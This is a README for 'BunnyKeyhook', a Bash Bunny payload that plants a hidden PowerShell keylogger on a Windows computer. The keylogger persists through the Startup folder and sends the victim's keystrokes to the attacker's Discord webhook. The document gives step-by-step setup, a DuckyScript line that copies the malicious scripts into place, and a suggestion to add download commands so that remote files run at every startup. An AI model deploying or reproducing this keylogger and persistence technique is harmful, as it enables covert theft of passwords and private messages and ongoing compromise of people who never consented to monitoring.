# BunnyKeyhook
> Chris Taylor [Blue Cosmo]
---

```
      :::::::::  :::    ::: ::::    ::: ::::    ::: :::   ::: :::    ::: :::::::::: :::   ::: :::    :::  ::::::::   ::::::::  :::    ::: 
     :+:    :+: :+:    :+: :+:+:   :+: :+:+:   :+: :+:   :+: :+:   :+:  :+:        :+:   :+: :+:    :+: :+:    :+: :+:    :+: :+:   :+:   
    +:+    +:+ +:+    +:+ :+:+:+  +:+ :+:+:+  +:+  +:+ +:+  +:+  +:+   +:+         +:+ +:+  +:+    +:+ +:+    +:+ +:+    +:+ +:+  +:+     
   +#++:++#+  +#+    +:+ +#+ +:+ +#+ +#+ +:+ +#+   +#++:   +#++:++    +#++:++#     +#++:   +#++:++#++ +#+    +:+ +#+    +:+ +#++:++       
  +#+    +#+ +#+    +#+ +#+  +#+#+# +#+  +#+#+#    +#+    +#+  +#+   +#+           +#+    +#+    +#+ +#+    +#+ +#+    +#+ +#+  +#+       
 #+#    #+# #+#    #+# #+#   #+#+# #+#   #+#+#    #+#    #+#   #+#  #+#           #+#    #+#    #+# #+#    #+# #+#    #+# #+#   #+#       
#########   ########  ###    #### ###    ####    ###    ###    ### ##########    ###    ###    ###  ########   ########  ###    ###       
```

## Overview:
BunnyKeyhook is a BashBunny payload that uses PowerShell to log keystrokes. It will send the logs to you via discord. The keylogger almost gives you a "live feed" of their keystrokes through discord. However, you can tweak the timing to get the logs sent to you quick
- moves *c.cmd* file to windows startup directory
- *c.cmd* will secretly run *p.ps1*
- *p.ps1* will log keystrokes 
- *l.ps1* will execute *p.ps1* every minue
    - this can be changed to a preferred delay
- *uninstaller.cmd* uninstalls the payload from the target computer

## Resources:
- [YouTube Video](https://youtu.be/U74QqEa4GRc)
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- Windows Target

## Instructions:
**Create Discord Webhook**
1. create a discord server by clicking the plus button in the bottom left

![Create Server](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/create-server.png)

2. go into the `integrations` section in the server's settings
3. click `Webhooks`
![Integrations](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/integrations.png)

4. create a new webhook by clicking `New Webhook`
5. click `Copy Webhook URL` to copy the webhook URL
![Webhook](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/webhook.png)

**Set-Up/Installation**
1. in line 5 of *p.ps1*, replace `DISCORDWEBHOOK` with the webhook URL 
```powershell
$webhook = "DISCORDWEBHOOK"
```
2. in line 17 of *duckyscript.txt*, change `'BashBunny'` to the name of your Bash Bunny
3. in line 17 *duckyscript.txt*, change `switch1` to switch position that stores the paylaod
    - make sure to replace *all* appearances of `switch1` if you decide to change 
```powershell
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
```

## Log Sending Delay
Changing the delay between log sends
1. in line 12 of *l.ps1*, change `60` to your preferred number of seconds
```powershell
Start-Sleep 60
```

## Extraneous:
The *c.cmd* attack opportunity
```
the c.cmd file runs every startup.
this means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
the file would then save in the startup directory,
allowing it to run every startup
```
---
- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)
